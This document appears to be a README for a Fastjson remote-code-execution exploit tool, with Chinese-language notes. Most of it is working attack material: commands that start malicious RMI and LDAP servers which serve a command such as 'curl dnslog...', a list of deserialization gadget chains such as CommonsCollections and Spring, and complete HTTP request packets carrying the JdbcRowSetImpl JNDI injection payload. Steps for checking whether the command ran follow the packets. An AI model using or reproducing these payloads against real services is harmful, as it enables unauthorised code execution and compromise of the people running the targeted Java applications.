# fastjson_rce_tool

![Image](https://xzfile.aliyuncs.com/xzvul/4afaaf0d31944b068e27afb45aae2556)

```
1. RMI (need tomcat8)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"


2. RMI/LDAP + HTTP
java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
/
java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"


3. LDAP2
java -cp fastjson_tool.jar LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
CommonsBeanutils1  
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Groovy1            
URLDNS             
JSON1              
Spring1            
Spring2            
file   （BASE64编码后的反序列内容文件）


```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功

===================================================================================================

else:
有些环境可能利用不成功，可以尝试默认的测试方法,



```

